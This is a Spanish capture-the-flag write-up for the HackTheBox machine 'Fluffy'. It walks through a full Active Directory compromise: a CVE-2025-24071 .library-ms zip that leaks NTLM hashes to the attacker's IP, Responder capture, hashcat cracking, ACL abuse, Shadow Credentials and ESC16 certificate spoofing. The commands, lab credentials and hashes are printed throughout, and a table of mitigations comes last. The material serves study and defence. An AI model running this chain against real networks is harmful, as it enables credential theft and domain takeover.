---
title: "HackTheBox — Fluffy"
date: 2026-09-13
draft: false
description: "Writeup de Fluffy (HTB Easy): CVE-2025-24071 (filtración NTLM vía .library-ms) → cracking NetNTLMv2 → BloodHound ACLs → Shadow Credentials → ESC16 UPN Spoofing → Administrator."
tags: ["HackTheBox", "Easy", "Windows", "ActiveDirectory", "SMB", "NTLM", "CVE-2025-24071", "BloodHound", "ShadowCredentials", "ADCS", "ESC16", "UPNSpoofing", "WinRM", "Certipy", "Responder"]
categories: ["HackTheBox"]
---

{{< lead >}}
Controlador de dominio Active Directory de dificultad fácil. La cadena completa: recurso SMB `IT` con escritura → **CVE-2025-24071** (`.library-ms` en `.zip` fuerza autenticación SMB saliente) → cracking NetNTLMv2 → **BloodHound** revela `GenericAll`/`GenericWrite` anidados → **Shadow Credentials** sobre `winrm_svc` y `ca_svc` → **ESC16** en AD CS (extensión de seguridad deshabilitada, mapeo débil por UPN) → suplantación de `Administrator`.
{{< /lead >}}

**IP:** `10.129.232.88` · **SO:** Windows Server 2019 (DC) · **Dificultad:** Fácil

---

## 1. Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.232.88
```

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667,49689,49690,49700,49707,49717,49736/tcp open  unknown
```

El juego de puertos (Kerberos, LDAP, SMB, ADWS, WinRM) es característico de un **controlador de dominio Active Directory**.

```bash
nmap -sC -sV -p389,636 10.129.232.88
```

```
389/tcp open  ldap  Microsoft Windows Active Directory LDAP
              (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: SAN: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```

Dominio `fluffy.htb`, controlador `DC01`. El desfase horario (~7h) será relevante para Kerberos.

---

## 2. Enumeración SMB

Con credenciales iniciales (`j.fleischman` : `J0elTHEM4n1990!`):

```bash
smbmap -H 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!'
```

```
Disk        Permissions
----        -----------
ADMIN$      NO ACCESS
C$          NO ACCESS
IPC$        READ ONLY
IT          READ, WRITE
NETLOGON    READ ONLY
SYSVOL      READ ONLY
```

El recurso `IT` permite **lectura y escritura**. Listamos su contenido:

```bash
smbmap -H 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' -r "IT"
```

```
Everything-1.4.1.1026.x64/
Everything-1.4.1.1026.x64.zip
KeePass-2.58/
KeePass-2.58.zip
Upgrade_Notice.pdf
```

---

## 3. Análisis de `Upgrade_Notice.pdf`

```bash
smbmap -H 10.129.232.88 -u j.fleischman -p 'J0elTHEM4n1990!' --download "IT\Upgrade_Notice.pdf"
pdftotext 10.129.232.88-IT_Upgrade_Notice.pdf && cat 10.129.232.88-IT_Upgrade_Notice.txt
```

```
FLUFFY
Patch Announcement: Mandatory Timeslot Booking for Critical Updates

Recent Vulnerabilities
CVE ID              Severity
CVE-2025-24996       Critical
CVE-2025-24071       Critical
CVE-2025-46785       High
CVE-2025-29968       High
CVE-2025-21193       Medium
CVE-2025-3445        Low
```

El propio departamento de IT nos señala qué CVEs les preocupan. **CVE-2025-24071** destaca: permite filtrar el hash NTLM de una víctima mediante un `.zip` malicioso con un fichero `.library-ms` — y ya tenemos un recurso `IT` con permiso de escritura al que accede el personal de IT.

---

## 4. CVE-2025-24071 — Filtración de NTLM vía `.library-ms`

### Generación del payload

```bash
python3 cve_2025_24071.py -n test -i 10.10.15.193 -s IT
```

```
[+] Wrote ./test.library-ms
[+] Wrote ./test.zip
[+] Removed intermediate test.library-ms
[+] Done. Deliver ./test.zip to the target and get it extracted.
```

Un fichero `.library-ms` puede declarar una carpeta remota (`\\<IP_atacante>\share`) como parte de una "biblioteca" de Windows. Cuando el Explorador de Windows indexa o previsualiza el `.zip`, intenta resolver la ruta remota — generando una **autenticación SMB saliente** con el hash NetNTLMv2 del usuario.

### Entrega del payload

```bash
smbclient '//10.129.232.88/IT' -U 'j.fleischman%J0elTHEM4n1990!'
smb: \> put test.zip
smb: \> exit
```

### Captura del hash con Responder

```bash
responder -I tun0
```

```
[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:ca1ffb03f3cc9670:15DBBA15BC9E5A63435D2638A2184133:0101...
```

El usuario `p.agila` interactuó con nuestro fichero, filtrando su hash.

### Cracking

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O --force
```

```
P.AGILA::FLUFFY:...:prometheusx-303
```

✅ **Credenciales:** `p.agila` : `prometheusx-303`

---

## 5. Enumeración de Active Directory con BloodHound

```bash
bloodhound-python -d fluffy.htb -u 'p.agila' -p 'prometheusx-303' \
    -dc 'dc01.fluffy.htb' -c all -ns 10.129.232.88
```

```
INFO: Found AD domain: fluffy.htb
INFO: Found 1 computers
INFO: Found 10 users
INFO: Found 54 groups
```

En BloodHound, marcamos `p.agila` como *owned* y revisamos **Outbound Object Control → Transitive Object Control**:

1. `p.agila` ∈ grupo **`Service Account Managers`**
2. `Service Account Managers` tiene **`GenericAll`** sobre el grupo **`Service Accounts`**
3. `Service Accounts` tiene **`GenericWrite`** sobre `ca_svc`, `winrm_svc` y `ldap_svc`
4. `winrm_svc` ∈ **`Remote Management Users`** → puede autenticarse por WinRM

Si usamos el `GenericAll` para añadirnos al grupo `Service Accounts`, heredamos el `GenericWrite` — y `GenericWrite` sobre una cuenta permite un ataque de **Shadow Credentials** (añadir una clave pública alternativa sin cambiar la contraseña).

---

## 6. Abuso de ACLs y Shadow Credentials

### Unirse al grupo `Service Accounts`

```bash
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d fluffy.htb --host 10.129.232.88 \
    add groupMember 'service accounts' p.agila
```

```
[+] p.agila added to service accounts
```

```bash
echo "10.129.232.88 fluffy.htb dc01.fluffy.htb" | sudo tee -a /etc/hosts
```

### Shadow Credentials sobre `winrm_svc`

`GenericWrite` sobre un usuario permite modificar su atributo `msDS-KeyCredentialLink`. Añadiendo una clave pública que controlamos podemos autenticarnos como esa cuenta mediante **PKINIT** sin conocer su contraseña y recuperar su hash NT vía U2U.

```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account winrm_svc
```

```
NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

### Acceso WinRM y `user.txt`

```bash
evil-winrm -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -i dc01.fluffy.htb
```

```
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
632d5c032d30fcb8fe412a989fd97692
```

---

## 7. Enumeración de AD CS — ESC16

```bash
nxc ldap 10.129.232.88 -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767 -M adcs
```

```
ADCS  Found PKI Enrollment Server: DC01.fluffy.htb
ADCS  Found CN: fluffy-DC01-CA
```

```bash
certipy find -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
    -dc-ip 10.129.232.88 -vulnerable -enabled -stdout
```

```
[!] Vulnerabilities
ESC16 : Security Extension is disabled.
```

**ESC16:** la CA tiene deshabilitada la extensión `szOID_NTDS_CA_SECURITY_EXT`, que normalmente incluye el SID del solicitante en el certificado emitido. Sin ella, el controlador de dominio usa un **mapeo débil por `userPrincipalName` (UPN)** — lo que permite suplantar cualquier cuenta cuyo UPN podamos igualar, incluida `Administrator`.

---

## 8. Explotación — ESC16: UPN Spoofing para suplantar a `Administrator`

### Paso 1 — Hash NT de `ca_svc` (con ajuste de reloj)

El primer intento falla por el desfase horario detectado con Nmap:

```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
# [-] KRB_AP_ERR_SKEW(Clock skew too great)
```

```bash
ntpdate 10.129.232.88
# CLOCK: time stepped by 1112.160389
```

```bash
certipy shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc
```

```
NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

### Paso 2 — Suplantar el UPN de `ca_svc` como `administrator`

Con `GenericWrite` sobre `ca_svc` podemos modificar directamente su `userPrincipalName`:

```bash
certipy account update -username 'ca_svc@fluffy.htb' \
    -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
    -user ca_svc -upn 'administrator'
```

```
[*] Updated 'ca_svc':
    userPrincipalName : administrator
```

### Paso 3 — Solicitar certificado con UPN `administrator`

```bash
certipy req -u 'ca_svc' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
    -dc-ip 10.129.232.88 -target 'dc01.fluffy.htb' \
    -ca 'fluffy-DC01-CA' -template 'User'
```

```
[*] Got certificate with UPN 'administrator'
[*] Saving certificate and private key to 'administrator.pfx'
```

La plantilla `User` permite autenticación de cliente, y el certificado lleva el UPN que `ca_svc` tenía en ese momento — `administrator`. Como ESC16 deshabilita la extensión de seguridad, el DC resuelve la identidad por UPN, no por SID.

### Paso 4 — Restaurar el UPN original (limpieza)

```bash
certipy account update -username "p.agila@fluffy.htb" -p "prometheusx-303" \
    -user ca_svc -upn 'ca_svc@fluffy.htb'
```

```
[*] Updated 'ca_svc':
    userPrincipalName : ca_svc@fluffy.htb
```

### Paso 5 — Autenticar con el certificado y obtener el hash de `Administrator`

```bash
certipy auth -pfx administrator.pfx -domain 'fluffy.htb' -dc-ip 10.129.232.88
```

```
[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

---

## 9. Root Flag

```bash
evil-winrm -u 'Administrator' -H 8da83a3fa618b6e3a00e93f676c92a6e -i dc01.fluffy.htb
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b7fe7922d452282b47e804e10dae6701
```

---

## 10. Cadena de Ataque

```
j.fleischman → SMB "IT" (escritura)
        ↓
Upgrade_Notice.pdf → CVE-2025-24071 identificado como objetivo
        ↓
test.zip (.library-ms) subido al recurso IT
        ↓
p.agila interactúa → hash NetNTLMv2 capturado por Responder
        ↓
hashcat → p.agila : prometheusx-303
        ↓
BloodHound: p.agila → GenericAll sobre "Service Accounts"
             → GenericWrite sobre ca_svc / winrm_svc / ldap_svc
        ↓
bloodyAD: p.agila se añade a "Service Accounts"
        ↓
certipy shadow auto → winrm_svc NT hash → WinRM → user.txt
        ↓
certipy find → ESC16 (extensión de seguridad deshabilitada en fluffy-DC01-CA)
        ↓
certipy shadow auto → ca_svc NT hash
        ↓
UPN de ca_svc = "administrator" → certipy req (plantilla User) → administrator.pfx
        ↓
UPN de ca_svc restaurado → certipy auth → Administrator NT hash
        ↓
WinRM como Administrator → root.txt
```

---

## 11. Mitigaciones

| Vector | Mitigación |
|---|---|
| Recurso SMB `IT` con escritura para usuarios no administrativos | Principio de mínimo privilegio en ACLs de recursos compartidos |
| CVE-2025-24071 (`.library-ms` en `.zip`) | Aplicar el parche de Microsoft; filtrar `.library-ms` en recursos compartidos; restringir NTLM saliente |
| Hash NTLM crackeable offline | Deshabilitar NTLM donde sea posible; forzar Kerberos; contraseñas robustas + SMB signing |
| ACLs de AD excesivamente permisivas (`GenericAll`/`GenericWrite` anidadas) | Auditar ACLs periódicamente con BloodHound; evitar cadenas de delegación que terminen sobre cuentas privilegiadas |
| Shadow Credentials (`msDS-KeyCredentialLink`) | Monitorizar modificaciones al atributo; restringir qué principals pueden escribirlo |
| ESC16 (mapeo débil por UPN) | Habilitar `StrongCertificateBindingEnforcement`; restringir modificación de `userPrincipalName` |
| Desfase horario elevado | Sincronizar todos los hosts contra una fuente NTP fiable |
